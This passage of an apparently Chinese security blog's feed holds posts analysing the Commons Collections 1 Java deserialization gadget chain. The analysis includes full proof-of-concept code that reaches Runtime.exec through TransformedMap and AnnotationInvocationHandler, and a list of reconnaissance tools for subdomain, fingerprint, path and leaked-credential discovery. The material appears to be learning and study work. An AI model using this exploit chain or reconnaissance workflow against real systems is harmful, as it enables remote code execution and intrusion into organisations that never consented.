alt="image-20220425004347242"></p><p>假设这里我们通过反射调用<code>AnnotationInvocationHandler</code>，并传入两个参数，一个是<code>Retention.class</code>，另一个是<code>outerMap</code>。<code>Retention</code>是一个注解类。<code>outerMap</code>是我们<code>TransformedMap</code>修饰过的类。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class  clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">    Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">    construct.setAccessible(true);</span><br><span class="line">    InvocationHandler handler = (InvocationHandler)construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure><p>这时候在 <code>AnnotationInvocationHandler</code>的<code>readObject</code>方法里面 <code>memberValues</code>就是我们使用反射传入的 <code>TransformedMap</code>的对象。代码中遍历了它的所有元素，并依次设置值。在调用<code>setValue</code>设置值的时候就会触发<code>TransformedMap</code>⾥的<code>Transform</code>方法，从而导致命令的执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">      // for (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span><br><span class="line">            String name = memberValue.getKey();</span><br><span class="line">           Object value = null;</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            if (memberType != null) &#123;  // i.e. member still exists</span><br><span class="line">               Object value = memberValue.getValue();</span><br><span class="line">               value = memberValue.getValue();</span><br><span class="line">                if (!(memberType.isInstance(value) ||</span><br><span class="line">                      value instanceof ExceptionProxy)) &#123;</span><br><span class="line">                   memberValue.setValue(</span><br><span class="line">                       new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                   value = new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">                               annotationType.members().get(name)));</span><br><span class="line">                               annotationType.members().get(name));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">           mv.put(name, value);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">        </span><br><span class="line">            Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;</span><br><span class="line">                            String.class,</span><br><span class="line">                            Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,</span><br><span class="line">                            new Class[0] &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;</span><br><span class="line">                            Object.class,</span><br><span class="line">                            Object[].class &#125;, new Object[] &#123; null, new</span><br><span class="line">                            Object[0] &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class</span><br><span class="line">                    &#125;,</span><br><span class="line">                            new String[] &#123;</span><br><span class="line">                                    &quot;calc.exe&quot; &#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformerChain = new</span><br><span class="line">                    ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = new HashMap();</span><br><span class="line">            innerMap.put(&quot;value&quot;, &quot;xxxx&quot;);</span><br><span class="line">            Map outerMap = TransformedMap.decorate(innerMap, null,</span><br><span class="line">                    transformerChain);</span><br><span class="line">            Class clazz =</span><br><span class="line">                    Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">            Constructor construct = clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">                    Map.class);</span><br><span class="line">            construct.setAccessible(true);</span><br><span class="line">            InvocationHandler handler = (InvocationHandler)</span><br><span class="line">                    construct.newInstance(Retention.class, outerMap);</span><br><span class="line">            ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">            oos.writeObject(handler);</span><br><span class="line">            oos.close();</span><br><span class="line">            System.out.println(barr);</span><br><span class="line">            ObjectInputStream ois = new ObjectInputStream(new</span><br><span class="line">                    ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">            Object o = (Object)ois.readObject();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行弹出计算器</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425014904438-114576049.png" alt="image-20220425014902982"></p><p>测试过程发现，jdk1.8.0_321无法达到命令执行的目的，后面换了个jdk1.7.0_21才执行成功</p><p>在高版本中的<code>AnnotationInvocationHandler</code>的<code>readObject</code>是被改动过的，如下为低版本jdk</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425015123743-612622047.png" alt="image-20220425015122452"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13791793.html">https://www.cnblogs.com/nice0e3/p/13791793.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;继续接着上文，上文我们通过方法调用弹出了计算器，那么在反序列化的漏洞场景下该如何运用呢。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>常用的信息收集工具</title>
    <link href="https://kpa1on.github.io/2022/03/31/%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/"/>
    <id>https://kpa1on.github.io/2022/03/31/%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/</id>
    <published>2022-03-31T15:31:11.000Z</published>
    <updated>2022-04-26T05:08:24.391Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h3><h4 id="爱站、站长工具"><a href="#爱站、站长工具" class="headerlink" title="爱站、站长工具"></a>爱站、站长工具</h4><p>SEO综合查询：根据域名来收集目标站点的备案信息、名称、注册人等信息</p><span id="more"></span><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331234824808-1321230515.png" alt="image-20220331234824770"></p><p>ICP备案查询：可以查询该单位备案的其它网站</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331235548245-1513379625.png" alt="image-20220331235548490"></p><p>Whois查询：可以通过域名、邮箱、注册人查询目标信息，或者通过Whois反查获取更多的信息</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331235812621-1264700791.png" alt="image-20220331235812791"></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331235833979-743434060.png" alt="image-20220331235834229"></p><h4 id="天眼查、企查查"><a href="#天眼查、企查查" class="headerlink" title="天眼查、企查查"></a>天眼查、企查查</h4><p>天眼查：根据前面获取的企业名称可以获取目标企业的微信公众号、微博、备案站点、APP、软件著作权等信息。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401001038436-305034698.png" alt="image-20220401001038521"></p><h4 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h4><ul><li>OneForAll：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 oneforall.py --target xxx.cn run</span><br></pre></td></tr></table></figure><ul><li>JSFinder：<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 JSFinder.py -u http://www.xxx.cn -d -ou JSurl.txt -os JSdomain.txt</span><br></pre></td></tr></table></figure><ul><li>Layer</li><li>subDomainsBrute：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python subDomainsBrute.py -t 10 xxx.cn -o xxx.cn.txt</span><br><span class="line">python subDomainsBrute.py -t 10 --full xxx.cn -o xxx.cn.txt //全扫描</span><br></pre></td></tr></table></figure><ul><li><p>dnsub：<a href="https://github.com/yunxu1/dnsub/">https://github.com/yunxu1/dnsub/</a></p></li><li><p>Findomain：<a href="https://github.com/Findomain/Findomain">https://github.com/Findomain/Findomain</a></p></li><li><p>subdomain3：<a href="https://github.com/yanxiu0614/subdomain3">https://github.com/yanxiu0614/subdomain3</a></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python brutedns.py -d tagetdomain -s high -l 5</span><br></pre></td></tr></table></figure><ul><li>Sublist3r：<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sublist3r.py -d 6pian.cn -o xxx.cn-sublist3r.txt</span><br></pre></td></tr></table></figure><ul><li>DNSdumpster：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></li><li>在线域名爆破：<a href="http://z.zcjun.com/">http://z.zcjun.com</a></li><li>小蓝本：<a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></li><li>谷歌语法：site:url.com</li></ul><h3 id="APP信息收集"><a href="#APP信息收集" class="headerlink" title="APP信息收集"></a>APP信息收集</h3><ul><li>七麦数据：<a href="https://www.qimai.cn/">https://www.qimai.cn/</a></li></ul><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401003223994-2015673218.png" alt="image-20220401003224149"></p><ul><li>小蓝本：<a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></li></ul><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401003436145-1522334794.png" alt="image-20220401003436333"></p><ul><li>AppStore：<a href="https://apps.apple.com/">https://apps.apple.com/</a></li></ul><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401004923689-1032764987.png" alt="image-20220401004923517"></p><ul><li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li></ul><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401011632625-394917638.png" alt="image-20220401011632788"></p><ul><li>点点：<a href="https://app.diandian.com/">https://app.diandian.com/</a></li></ul><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401011706699-1039405072.png" alt="image-20220401011706880"></p><h3 id="公众号收集"><a href="#公众号收集" class="headerlink" title="公众号收集"></a>公众号收集</h3><ul><li>搜狗搜索引擎：<a href="https://weixin.sogou.com/weixin">https://weixin.sogou.com/weixin</a></li></ul><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401005726464-268705547.png" alt="image-20220401005725553"></p><ul><li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li></ul><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401005946939-1109072144.png" alt="image-20220401005947045"></p><ul><li>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></li></ul><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401011237675-182402682.png" alt="image-20220401011237714"></p><h3 id="微信小程序"><a href="#微信小程序" class="headerlink" title="微信小程序"></a>微信小程序</h3><ul><li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li></ul><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401011528721-1750840481.png" alt="image-20220401011528606"></p><h3 id="IP信息收集"><a href="#IP信息收集" class="headerlink" title="IP信息收集"></a>IP信息收集</h3><ul><li>Nmap、Masscan：Github上面有一款工具将Nmap和Masscan集成起来，先用Masscan批量扫端口，然后用Nmap识别服务。下载地址：<a href="https://github.com/cwkiller/masscan_to_nmap">https://github.com/cwkiller/masscan_to_nmap</a></li><li>小米范WEB查找器</li><li>Fofa、Shodan、ZoomEye</li><li>利用GoogleHacking</li></ul><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><ul><li>BugScaner：<a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com</a></li><li>潮汐指纹：<a href="http://finger.tidesec.com/">http://finger.tidesec.com</a></li><li>Kscan：<a href="https://github.com/lcvvvv/kscan">https://github.com/lcvvvv/kscan</a></li><li>dismap：<a href="https://github.com/zhzyker/dismap">https://github.com/zhzyker/dismap</a></li><li>Ehole：<a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></li><li>ObserverWard：<a href="https://github.com/0x727/ObserverWard">https://github.com/0x727/ObserverWard</a></li><li>scaninfo：<a href="https://github.com/redtoolskobe/scaninfo">https://github.com/redtoolskobe/scaninfo</a></li><li>whatweb：<a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></li><li>TideFinger：<a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a></li></ul><h3 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h3><ul><li>github</li><li>网盘搜索</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">盘多多：http://www.panduoduo.net/</span><br><span class="line">盘搜搜：http://www.pansoso.com/</span><br><span class="line">盘搜：http://www.pansou.com/</span><br><span class="line">凌云风搜索：https://www.lingfengyun.com/</span><br><span class="line">直接输入厂商名字然后搜索，可以看看是否泄露了源码，或者什么账号密码之类的</span><br></pre></td></tr></table></figure><ul><li>路径扫描</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dirsearch：https://github.com/maurosoria/dirsearch</span><br><span class="line">dirmap：https://github.com/H4ckForJob/dirmap</span><br><span class="line">御剑后台扫描</span><br><span class="line">7kbscan：https://github.com/7kbstorm/7kbscan-WebPathBrute</span><br></pre></td></tr></table></figure><ul><li>基于证书</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://myssl.com</span><br><span class="line">https://crt.sh/</span><br></pre></td></tr></table></figure><ul><li>基于shodan找到带有该icon的网站</li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/a_6M0h-7l9-IKG5F5Nar8g">https://mp.weixin.qq.com/s/a_6M0h-7l9-IKG5F5Nar8g</a></p><p><a href="https://mp.weixin.qq.com/s/uUrlBrwcPPPr6s1yFeGP1A">https://mp.weixin.qq.com/s/uUrlBrwcPPPr6s1yFeGP1A</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;域名信息收集&quot;&gt;&lt;a href=&quot;#域名信息收集&quot; class=&quot;headerlink&quot; title=&quot;域名信息收集&quot;&gt;&lt;/a&gt;域名信息收集&lt;/h3&gt;&lt;h4 id=&quot;爱站、站长工具&quot;&gt;&lt;a href=&quot;#爱站、站长工具&quot; class=&quot;headerlink&quot; title=&quot;爱站、站长工具&quot;&gt;&lt;/a&gt;爱站、站长工具&lt;/h4&gt;&lt;p&gt;SEO综合查询：根据域名来收集目标站点的备案信息、名称、注册人等信息&lt;/p&gt;</summary>
    
    
    
    <category term="工具使用" scheme="https://kpa1on.github.io/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="信息收集" scheme="https://kpa1on.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons Collections1分析（一）</title>
    <link href="https://kpa1on.github.io/2022/03/31/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://kpa1on.github.io/2022/03/31/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2022-03-31T13:29:33.000Z</published>
    <updated>2022-03-31T15:02:59.605Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在CC链的前置基础学习完后，就可以开始学习CC链的具体执行流程。</p><span id="more"></span><h3 id="CC链分析"><a href="#CC链分析" class="headerlink" title="CC链分析"></a>CC链分析</h3><p>先来看下poc代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.*;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        //将transformers数组存入ChaniedTransformer这个继承类</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        //创建Map并绑定transformer</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        //给予map数据转化链</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">        //触发漏洞</span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span><br><span class="line">        onlyElement.setValue(&quot;test&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面逐一分析</p><p>先看下面这段代码，<code>ConstantTransformer</code>和<code>InvokerTransformer</code>都是<code>Transformer</code>接口的实现类，通过new创建了一个 Transformer类型的数组，里面存储的是 Transformer的实现类对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><h3 id="ConstantTransformer分析"><a href="#ConstantTransformer分析" class="headerlink" title="ConstantTransformer分析"></a>ConstantTransformer分析</h3><p>先来分析一下<code>ConstantTransformer</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331213802750-70517686.png" alt="image-20220331213801907"></p><p>这里是使用了构造方法传入参数，poc中传入的参数为<code>Runtime.class</code>，而在调用到transform时，会返回我们传入的参数，也就是返回这里的<code>iConstant</code>。</p><h3 id="InvokerTransformer分析"><a href="#InvokerTransformer分析" class="headerlink" title="InvokerTransformer分析"></a>InvokerTransformer分析</h3><p>打一个debug跟踪到<code>InvokerTransformer</code>类的构造方法里面</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331214255708-71059607.png" alt="image-20220331214256009"></p><p>可以看到传入到构造方法中有三个参数，第一个是方法名，第二个是参数类型，第三个是参数的值。</p><p>poc里的三个<code>InvokerTransformer</code>的参数值，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getMethod,new Class[]&#123;String.class, Class[].class&#125;,new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;</span><br><span class="line">invoke,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;</span><br><span class="line">exec,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc.exe&quot;&#125;</span><br></pre></td></tr></table></figure><p>在<code>InvokerTransformer</code>类中同样存在<code>transform</code>方法，后面再具体分析</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331214746603-820866591.png" alt="image-20220331214746902"></p><h3 id="ChainedTransformer分析"><a href="#ChainedTransformer分析" class="headerlink" title="ChainedTransformer分析"></a>ChainedTransformer分析</h3><p>poc代码继续往下分析，可以看到如下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transformer transformerChain = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure><p>将<code>transformers</code>数组传入<code>ChainedTransformer</code>构造方法里面。在构造方法中将<code>transformers</code>赋值给本类的成员变量<code>iTransformers</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215100803-248909615.png" alt="image-20220331215101175"></p><p>该类同样存在<code>transform</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215116522-1090283627.png" alt="image-20220331215116950"></p><p><code>transform</code>方法的作用会遍历<code>transformers</code>数组，然后逐个去调用它的<code>transform</code>方法。 并且还可以看出该方法会将第一次的执行结果传递给第二次执行的参数里面去。知道了<code>ChainedTransformer</code>的作用后，我们需要知道的是<code>ChainedTransformer</code>的<code>transform</code>什么时候会被调用。继续往下调试</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215715399-2078158251.png" alt="image-20220331215715632"></p><p>进入<code>setValue</code>方法，继续跟进，可以在<code>TransformedMap#checkSetValue</code>方法中发现调用了<code>ChainedTransformer</code>的<code>transform</code>方法，这里之前在前置学习中就已经分析过了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215643520-1021755760.png" alt="image-20220331215643925"></p><p>后面自然就循环调用每个<code>Transformer</code>的<code>transform</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215923877-1365581574.png" alt="image-20220331215924083"></p><p>根据顺序，会调用第一个<code>ConstantTransformer</code>的<code>transform</code>方法，也就是返回构造函数中设置的<code>iConstant</code>，这里就是<code>Runtime.class</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331220100853-1922932681.png" alt="image-20220331220101252"></p><p>接着往下，就到了InvokerTransformer，可以看到参数input的值是上个Transformer返回的结果Runtime.class，后面就是利用反射拿到Runtime对象，因为Runtime没有构造方法需要调用getRuntime()方法获取到Runtime对象，所以这里的流程是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getClass().getMethod(&quot;getRuntime&quot;,null).invoke() -&gt; Method</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331220634247-69976373.png" alt="image-20220331220634207"></p><p>继续跟，来到第二个<code>InvokerTransformer</code>，分析如上，因为上面获得了一个Method，那么我们就需要调用它的invoke方法来执行，所以这里getMethod方法里的参数值为invoke，第二个参数即参传入的参数类型Object</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331222329052-1798048744.png" alt="image-20220331222329120"></p><p>接着往下，来到第三个<code>InvokerTransformer</code>，也就是最后一个<code>Transformer</code>，这里可以看到输入input成功拿到Runtime对象，现在只需要执行<code>Runtime#exe</code>方法即可，同样先通过<code>getMethod</code>方法拿到exec对应的Method，所以这里<code>getMethod</code>的第一个参数，就是exec，第二个参数即exec方法执行的参数类型String，返回method，然后调用invoke执行，参数为calc.exe。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331223102527-1052480704.png" alt="image-20220331223102622"></p><p>之后弹出计算器</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331224112146-817721721.png" alt="image-20220331224112138"></p><p>整个过程归纳</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过ConstantTransformer得到Runtime.class,然后再InvokerTransformer反射得到getRuntime方法，然后通过反射执行invoke才能去调用getRuntime方法，这样得到一个Runtime对象，然后再去调用Runtime对象的exec方法去达到命令执行。</span><br></pre></td></tr></table></figure><h3 id="transform方法调用分析"><a href="#transform方法调用分析" class="headerlink" title="transform方法调用分析"></a>transform方法调用分析</h3><p>分析下poc中<code>TransformedMap#decorate</code>方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br></pre></td></tr></table></figure><p>调试进入decorate方法，然后跟进来到<code>TransformedMap</code>的构造方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331224824303-1180474727.png" 